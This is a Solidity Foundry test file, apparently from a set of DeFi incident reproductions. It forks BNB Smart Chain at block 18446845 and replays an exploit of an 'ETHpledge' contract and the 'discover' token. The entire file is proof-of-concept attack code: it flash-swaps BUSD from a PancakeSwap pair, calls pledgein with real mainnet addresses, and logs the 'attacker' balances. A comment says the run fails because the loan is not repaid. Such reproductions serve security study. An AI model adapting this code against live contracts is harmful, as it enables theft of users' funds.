// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface ETHpledge {
    function pledgein(address fatheraddr, uint256 amountt) external returns (bool);
}
// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT]
// Because we don't repay funds to pancake.

contract ContractTest is Test {
    IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair PancakePair2 = IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
    ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor() {
        cheats.createSelectFork("bsc", 18_446_845); // fork bsc at block 18446845

        busd.approve(address(ethpledge), type(uint256).max);
        discover.approve(address(ethpledge), type(uint256).max);
    }

    function testExploit() public {
        bytes memory data = abi.encode(address(this), 19_810_777_285_664_651_588_959);
        emit log_named_uint("Before flashswap, BUSD balance of attacker:", busd.balanceOf(address(this)));
        PancakePair2.swap(19_810_777_285_664_651_588_959, 0, address(this), data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        emit log_named_uint("After flashswap, BUSD balance of attacker:", busd.balanceOf(address(this)));
        ethpledge.pledgein(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930, 2_000_000_000_000_000_000_000);
        emit log_named_uint(
            "After Exploit, discover balance of attacker:",
            discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
        );
    }

    receive() external payable {}
}
